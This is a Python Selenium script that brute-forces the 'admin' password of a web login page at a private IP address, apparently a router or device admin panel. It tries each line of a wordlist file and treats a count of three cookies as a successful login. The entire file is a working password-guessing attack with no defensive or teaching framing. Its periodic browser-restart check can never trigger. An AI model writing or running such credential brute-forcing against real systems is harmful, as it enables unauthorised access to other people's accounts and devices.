from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

# Initialize the browser and go to the login page
browser = webdriver.Chrome("../chromedriver.exe ")
browser.get("http://192.168.1.198/")
with open("file.txt","r") as f:
    lists = f.readlines()
rog = []
for c in lists:
    word = c.splitlines()
    rog.append(word[0])
count = 1
for c in rog:
# Find the username and password fields and enter your credentials
    username = browser.find_element_by_id("login_user")
    username.send_keys("admin")
    password = browser.find_element_by_id("login_psw")
    password.send_keys(c)

    # Find the submit button and click it to log in
    submit_button = browser.find_elements_by_link_text("Login")
    submit_button[0].click()
    time.sleep(2)
   

    # Verify that you have successfully logged in
    check = browser.get_cookies()
    if len(check) == 3:
        print("Logged in successfully",c)
        break
    else:
        # print("Error logging in",c)
        if count/6==0 :
            browser.quit()
            browser = webdriver.Chrome("../chromedriver.exe ")
            browser.get("http://192.168.1.198")
            print(count,"count1")
    browser.refresh()
    count = count + 1
    print(count,"count2")
    
